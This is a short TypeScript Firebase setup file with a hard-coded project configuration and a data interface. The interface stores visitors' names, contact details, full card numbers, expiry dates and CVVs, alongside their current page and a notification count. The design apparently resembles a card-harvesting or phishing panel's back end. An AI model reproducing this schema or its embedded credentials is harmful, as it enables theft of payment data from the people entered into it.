import { initializeApp, getApps, getApp } from "firebase/app";
import { getAuth } from "firebase/auth";
import { getFirestore } from "firebase/firestore";
import { getDatabase } from "firebase/database";

const firebaseConfig = {
  apiKey: "AIzaSyAlTDyrStDLFU-4gOisNqI3k5DQe5SVJVE",
  authDomain: "mnmyf-e2a1f.firebaseapp.com",
  databaseURL: "https://mnmyf-e2a1f-default-rtdb.firebaseio.com",
  projectId: "mnmyf-e2a1f",
  storageBucket: "mnmyf-e2a1f.firebasestorage.app",
  messagingSenderId: "423118881361",
  appId: "1:423118881361:web:03e76378f19dc9e7f9ae70",
  measurementId: "G-B1CQC966C2"};

const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);
const database = getDatabase(app);

export { app, auth, db, database };

export interface NotificationDocument {
  id: string;
  name: string;
  hasPersonalInfo: boolean;
  hasCardInfo: boolean;
  currentPage: string;
  time: string;
  notificationCount: number;
  personalInfo?: {
    fullName: string;
    email: string;
    phone: string;
    address: string;
  };
  cardInfo?: {
    cardNumber: string;
    expirationDate: string;
    cvv: string;
  };
}



